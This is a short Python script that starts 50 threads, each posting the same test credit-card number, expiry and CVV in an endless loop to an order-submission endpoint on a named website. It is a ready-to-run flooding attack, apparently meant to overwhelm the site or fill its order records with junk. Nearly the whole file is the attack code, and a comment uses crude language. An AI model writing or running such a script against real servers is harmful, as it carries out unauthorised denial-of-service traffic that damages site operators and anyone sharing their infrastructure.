import requests
import threading

url = 'http://luckypro12.com/PS5/includes/submit_order_limelight.php'

data = {
  'cc_number': '4007000000027',
  'cc_expmonth': '08',
  'cc_expyear': '21',
  'cc_cvv': '234',
}

# Multithread this btch
def do_request():
  while True:
    response = requests.post(url, data=data).text
    print(response)

threads = []

for i in range(50):
  t = threading.Thread(target=do_request)
  t.daemon = True
  threads.append(t)
  
for i in range(50):
  threads[i].start()
  
for i in range(50):
  threads[i].join()
